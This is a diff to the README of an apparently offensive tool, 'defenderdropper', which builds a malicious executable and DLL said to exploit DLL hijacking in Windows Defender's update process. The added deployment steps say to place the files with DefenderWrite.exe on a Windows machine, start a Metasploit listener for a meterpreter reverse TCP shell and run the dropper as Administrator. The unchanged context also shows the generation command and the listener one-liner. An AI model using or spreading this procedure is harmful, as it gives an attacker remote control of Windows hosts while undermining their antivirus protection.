@@ -46,6 +46,19 @@ python3 defenderdropper.py 10.0.2.147 4443 -o malicious.exe
 msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 10.0.2.147; set LPORT 4443; exploit'
 ```
 
+# DEPLOYMENT STEPS:
+
+1. Download DefenderWrite.exe if not installed from: https://github.com/TwoSevenOneT/DefenderWrite
+2. On Windows VM, place these 3 files in SAME directory:
+   - {exe_name}
+   - {dll_name}
+   - DefenderWrite.exe
+
+3. Start listener: ```msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {args.LHOST}; set LPORT {args.LPORT}; exploit'```
+4. Run {exe_name} as Administrator on Windows VM
+
+
+
 # How It Works
 Technical Overview
 DLL Hijacking: Exploits Windows Defender's vulnerable update process
